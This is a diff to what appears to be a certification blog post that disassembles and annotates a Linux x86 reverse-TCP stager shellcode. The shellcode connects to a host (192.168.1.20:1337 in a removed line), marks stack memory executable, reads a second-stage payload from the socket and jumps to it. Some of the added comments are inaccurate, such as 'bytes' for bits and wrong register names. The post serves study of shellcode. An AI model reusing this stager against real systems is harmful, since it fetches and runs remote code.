@@ -465,42 +465,42 @@ Payload size: 123 bytes
 00000025  57                push edi
 00000026  89E1              mov ecx,esp             ; connect() arguments used in second parameter for socketcall
 00000028  43                inc ebx                 ; SYS_CONNECT
-00000029  CD80              int 0x80
-0000002B  85C0              test eax,eax
-0000002D  7919              jns 0x48
-0000002F  4E                dec esi
-00000030  743D              jz 0x6f
+00000029  CD80              int 0x80                ; Execute syscall
+0000002B  85C0              test eax,eax            ; Test if connect() returned success
+0000002D  7919              jns 0x48                ; If not zero, jump to 0x48 and exit program
+0000002F  4E                dec esi                 ; Decrease edi
+00000030  743D              jz 0x6f                 ; If zero, exit program
 00000032  68A2000000        push dword 0xa2
-00000037  58                pop eax
-00000038  6A00              push byte +0x0
-0000003A  6A05              push byte +0x5
-0000003C  89E3              mov ebx,esp
-0000003E  31C9              xor ecx,ecx
-00000040  CD80              int 0x80
+00000037  58                pop eax                 ; syscall sys_nanosleep 162
+00000038  6A00              push byte +0x0          ; timespec structure tv_nsec
+0000003A  6A05              push byte +0x5          ; timespec structure tv_sec -> Sleep 5 seconds
+0000003C  89E3              mov ebx,esp             ; ebx points to timespec structure
+0000003E  31C9              xor ecx,ecx             ; last argument for sys_nanosleep is zero
+00000040  CD80              int 0x80                ; Execute syscall
 00000042  85C0              test eax,eax
-00000044  79BD              jns 0x3
-00000046  EB27              jmp short 0x6f
-00000048  B207              mov dl,0x7
-0000004A  B900100000        mov ecx,0x1000
+00000044  79BD              jns 0x3                 ; if zero jump to 00000046
+00000046  EB27              jmp short 0x6f          ; if not zero exit program
+00000048  B207              mov dl,0x7              ; 7
+0000004A  B900100000        mov ecx,0x1000          ; size_t len 4096
 0000004F  89E3              mov ebx,esp
-00000051  C1EB0C            shr ebx,0xc
-00000054  C1E30C            shl ebx,0xc
-00000057  B07D              mov al,0x7d
-00000059  CD80              int 0x80
-0000005B  85C0              test eax,eax
-0000005D  7810              js 0x6f
-0000005F  5B                pop ebx
-00000060  89E1              mov ecx,esp
-00000062  99                cdq
-00000063  B224              mov dl,0x24
-00000065  B003              mov al,0x3
-00000067  CD80              int 0x80
-00000069  85C0              test eax,eax
-0000006B  7802              js 0x6f
-0000006D  FFE1              jmp ecx
-0000006F  B801000000        mov eax,0x1
-00000074  BB01000000        mov ebx,0x1
-00000079  CD80              int 0x80
+00000051  C1EB0C            shr ebx,0xc             ; shift ebx 12 bytes to the right
+00000054  C1E30C            shl ebx,0xc             ; shift ebx 12 bytes to the left
+00000057  B07D              mov al,0x7d             ; sys_mprotect 125
+00000059  CD80              int 0x80                ; Execute syscall
+0000005B  85C0              test eax,eax            ; Test if mprotect() returned success
+0000005D  7810              js 0x6f                 ; If zero, exit program
+0000005F  5B                pop ebx                 ; file descriptor for read()
+00000060  89E1              mov ecx,esp             ; move stack pointer to ecx = void *buf
+00000062  99                cdq                     ; 
+00000063  B224              mov dl,0x24             ; size_t count = 36 bytes
+00000065  B003              mov al,0x3              ; sys_read 03
+00000067  CD80              int 0x80                ; Execute syscall
+00000069  85C0              test eax,eax            ; Test if read() returned success
+0000006B  7802              js 0x6f                 ; If not zero, exit program
+0000006D  FFE1              jmp ecx                 ; Loop back to ecx
+0000006F  B801000000        mov eax,0x1             ; sys_exit 01
+00000074  BB01000000        mov ebx,0x1             ; Set return value to error
+00000079  CD80              int 0x80                ; Execute syscall
 ```
 
 Another tool we can use for analysing shellcode is [sctest](https://www.aldeid.com/wiki/Libemu/sctest) which can be used for emulating shellcode. Running the following commands will create a graphical image showing which syscalls are being made.
@@ -537,7 +537,7 @@ int connect (
 ) =  0;
 ```
 
-This shellcode will connect to 192.168.1.20 at port 1337.
+However, for some reason `sctest` does not show the last instructions on my machine. Therefore I'll have to manually debug everything after address `00000029` in the assembly output.
 
 ---
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
